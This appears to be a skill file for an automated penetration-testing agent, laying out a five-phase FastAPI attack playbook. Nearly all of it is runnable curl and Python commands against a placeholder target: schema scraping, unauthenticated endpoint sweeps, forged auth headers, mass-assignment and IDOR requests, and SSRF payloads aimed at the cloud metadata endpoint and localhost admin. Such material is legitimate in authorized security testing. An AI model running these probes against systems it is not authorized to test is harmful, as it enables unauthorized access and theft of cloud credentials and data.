---
name: framework-fastapi
description: "FastAPI security testing — OpenAPI schema exposure, auth dependency bypass, SSRF via request parameters, dependency injection abuse, pydantic bypass, debug endpoints. Triggers: 'fastapi', 'fast api', 'python api framework', 'openapi pentest', 'fastapi security', 'pydantic bypass', 'starlette security'."
---

# FastAPI Security Testing

FastAPI attack surface: auto-exposed OpenAPI docs, dependency injection, pydantic coercion.

## Phase 1: Schema & Endpoint Discovery

```bash
TARGET="https://TARGET"

# FastAPI auto-exposes OpenAPI schema
curl -s "$TARGET/openapi.json" | python3 -m json.tool | tee /workspace/output/openapi.json
curl -s "$TARGET/docs" -o /workspace/output/swagger-ui.html
curl -s "$TARGET/redoc" -o /workspace/output/redoc.html

# Extract all endpoints from schema
curl -s "$TARGET/openapi.json" | python3 -c "
import json,sys
spec = json.load(sys.stdin)
for path, methods in spec.get('paths',{}).items():
    for method in methods:
        print(f'{method.upper()} {path}')
" | tee /workspace/output/endpoints.txt
```

## Phase 2: Authentication Bypass

```bash
# Test endpoints without auth header
while IFS= read -r line; do
  method=$(echo $line | cut -d' ' -f1)
  path=$(echo $line | cut -d' ' -f2)
  code=$(curl -so /dev/null -w "%{http_code}" -X "$method" "$TARGET$path")
  [ "$code" != "401" ] && [ "$code" != "403" ] && echo "$code $method $path"
done < /workspace/output/endpoints.txt | tee /workspace/output/unauth-endpoints.txt

# Dependency injection bypass — try alternate auth headers
curl -s "$TARGET/api/admin" -H "Authorization: Bearer null"
curl -s "$TARGET/api/admin" -H "Authorization: Bearer undefined"
curl -s "$TARGET/api/admin" -H "Authorization: "
curl -s "$TARGET/api/admin" -H "X-API-Key: admin"
```

## Phase 3: Pydantic Type Coercion Bypass

```bash
# Boolean coercion
curl -s -X POST "$TARGET/api/users" \
  -H "Content-Type: application/json" \
  -d '{"is_admin":"true","role":"admin","user_id":"0"}'

# Integer overflow
curl -s -X GET "$TARGET/api/users/99999999999999999999"

# Negative ID IDOR
curl -s "$TARGET/api/users/-1"
curl -s "$TARGET/api/items/0"

# None/null type confusion
curl -s -X POST "$TARGET/api/auth" \
  -H "Content-Type: application/json" \
  -d '{"username":null,"password":null}'
```

## Phase 4: SSRF via URL Parameters

```bash
# Identify URL-accepting params from schema
curl -s "$TARGET/openapi.json" | python3 -c "
import json,sys
spec=json.load(sys.stdin)
for path,methods in spec.get('paths',{}).items():
    for method,detail in methods.items():
        for param in detail.get('parameters',[]):
            if any(k in param.get('name','').lower() for k in ['url','uri','endpoint','host','target','callback']):
                print(f'{method.upper()} {path} - param: {param[\"name\"]}')
"

# Test SSRF payloads on identified params
curl -s "$TARGET/api/fetch?url=http://169.254.169.254/latest/meta-data/"
curl -s "$TARGET/api/preview?target_url=http://localhost:8080/admin"
```

## Phase 5: Debug & Info Leakage

```bash
# Check for debug mode
curl -s "$TARGET/docs" | grep -i "debug\|test\|dev"
curl -s "$TARGET/__debug__"
curl -s "$TARGET/debug"

# Starlette admin (if mounted)
curl -s "$TARGET/admin"
curl -s "$TARGET/_admin"

# Check server headers
curl -sI "$TARGET" | grep -i "server\|x-process-time\|x-request-id"
```

## Output

Save to `/workspace/output/`:
- `openapi.json` — full API schema
- `endpoints.txt` — extracted endpoint list
- `unauth-endpoints.txt` — endpoints accessible without auth

## Next Phase

→ `vuln-api-testing` for deeper API security testing
→ `vuln-ssrf` for SSRF exploitation
